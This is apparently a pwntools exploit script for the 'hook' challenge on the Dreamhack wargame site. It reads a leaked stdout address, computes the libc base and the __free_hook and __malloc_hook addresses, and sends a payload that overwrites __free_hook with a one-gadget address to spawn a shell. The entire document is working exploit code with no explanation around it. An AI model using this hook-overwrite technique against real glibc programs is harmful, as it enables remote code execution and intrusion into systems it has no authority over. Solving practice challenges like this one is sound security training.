from pwn import *

r = remote("host3.dreamhack.games", 8310)
e = ELF("./hook")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
context.log_level = 'debug'

def slog(n,m)  : return success(" : ".join([n,hex(m)]))

# get stdout pointer addr
r.recvuntil("stdout: ")
stdout = r.recvuntil("\n").strip("\n")
stdout = int(stdout, 16)
slog("stdout address", stdout)

# get offset, addresses
#malloc_offset_gdb = 0x40c690
malloc_offset_symbol = libc.symbols["__malloc_hook"]
#free_offset_gdb = 0x40c800
free_offset_symbol = libc.symbols["__free_hook"]
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
slog("malloc offset", malloc_offset_symbol)
slog("free offset", free_offset_symbol)
slog("library base", libc_base)

# hooking
malloc_hook = libc_base + malloc_offset_symbol
free_hook = libc_base + free_offset_symbol
#binsh = libc_base + libc.symbols["system"]
slog("malloc hook", malloc_hook)
slog("free hook", free_hook)
#slog("/bin/sh", binsh)

oneshot_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
oneshot = libc_base + oneshot_gadget[1]
payload = p64(free_hook) + p64(oneshot)

# data
r.sendlineafter("Size: ", "100") #ld?
r.sendlineafter("Data: ", payload)

r.interactive()